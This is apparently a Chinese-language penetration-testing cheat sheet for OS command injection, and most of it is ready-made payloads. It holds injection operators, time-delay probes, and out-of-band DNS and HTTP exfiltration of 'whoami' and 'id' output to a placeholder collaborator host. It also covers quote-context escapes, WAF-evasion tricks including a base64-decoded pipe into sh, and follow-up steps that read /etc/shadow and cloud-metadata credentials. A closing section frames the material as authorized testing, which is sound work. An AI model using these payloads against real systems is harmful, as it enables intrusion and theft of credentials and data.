# 命令注入全栈（OS Command Injection）

> 通用注入面之一：用户输入进 shell 执行时的注入。核心：**先识别拼接位置（引号上下文），再选探针**；无回显走时间盲测 + OOB 外带。

## 一、注入操作符（探测第一枪）

```
; id                    # 分号（Linux/Windows 通用）
| id                    # 管道
|| id                   # OR（前命令失败才执行）
&& id                   # AND
`id`                    # 反引号（命令替换）
$(id)                   # $() 命令替换
%0a id                  # 换行（URL 编码）
\n id                   # 实际换行
& id                    # 后台符（Windows cmd）
%27id%27                # 引号+命令（特殊上下文）
```

## 二、常见漏洞代码模式

| 语言 | 危险模式 |
|------|---------|
| PHP | `system($cmd)`、`exec()`、`shell_exec()`、`passthru()`、`` `$cmd` ``、`popen()` |
| Python | `os.system()`、`os.popen()`、`subprocess.call(shell=True)`、`eval()`/`exec()` |
| Node.js | `child_process.exec()`、`execSync()`、`spawn(shell=true)` |
| Java | `Runtime.exec()`（无 shell 语义，需 `bash -c` 才注入）、`ProcessBuilder` |
| Perl | `system()`、`open("|cmd")`、`qx{}` |
| .NET | `Process.Start` + `cmd /c` |

**关键**：`Runtime.exec(String)` 不分词，直接 `;id` 不生效 → 先探 `bash -c`/`sh -c` 包裹的上下文。

## 三、无回显（盲注）检测

### 1. 时间盲测（基线 vs payload 差 5s+）
```
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# Windows:
& ping -n 6 127.0.0.1
| ping -n 6 127.0.0.1
```

### 2. OOB via DNS（首选，最可靠）
```
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
%26 nslookup %COLLAB%
```
- 收到 DNS 查询 = 命令执行成立；whoami 前缀同时带出用户名

### 3. OOB via HTTP
```
# curl/wget 到自己的监听器
; curl http://COLLAB/$(whoami)
| wget http://COLLAB/`id`
curl http://COLLAB/?u=$(id | sed 's/ /_/g')
```

## 四、上下文变化（注入位置决定 payload）

| 上下文 | 现象 | 打法 |
|--------|------|------|
| 引号内拼接 | `cat "user$input"` | 先闭合引号：`"; id; "` 或 `" && id && "` |
| 单引号内 | `'...$input...'` 无法用 $() | 闭合：`'; id; '` |
| 反引号内 | `` `$input` `` | 直接注入命令（无需闭合） |
| 参数位置 | `ls -l $input` | 纯参数注入：`--help`、`-exec` 类（glibc 参数注入） |
| 命令名拼接 | `$input -x` | 空格截断注入 |

**通用姿式**：先闭合引号/括号（`'` `"` `)` `}`），再放操作符+命令，最后补一个注释/引号收尾（`#` 或被忽略的报错）。

## 五、编码与绕 WAF（配合 waf-bypass）

- 空格过滤：`${IFS}`（Linux）、`%09`（tab）、`{cat,/etc/passwd}`（花括号）
- 关键字过滤：`c''at`、`c\at`、`$HOME` 拼接、反斜杠逃逸 `c\at`
- base64 混淆：`echo base64 | base64 -d | sh`
- 双重编码：URL 编码 → HTML 实体 → unicode（配合 WAF 产品矩阵）

## 六、利用面扩展（拿到执行后）

```
命令执行已被证明(RCE 达成)
├─ 读文件: cat /etc/passwd, /etc/shadow(需权限), 配置文件
├─ 网络: curl/wget 内网探测(SSRF 类面)
├─ 提权: 见 提权全栈手册.md（信息收集 → 对症）
├─ 横向: 见 内网域渗透手册.md（授权范围）
└─ 云元数据: curl 169.254.169.254 打云凭证（认钥闸后报告）
```

## 七、纪律
- 探测无害命令优先（`id`/`whoami`/`sleep 2`），不首枪弹 shell
- OOB 用到 DNSLOG/Collaborator（自己可控），证明出网能力即可
- RCE 验证完清理（文件/请求）；不反弹 shell 常驻、不下载工具落地
- PoC 描述写清：注入点 → payload → 回显/OOB 证据（DNS 查询截图）
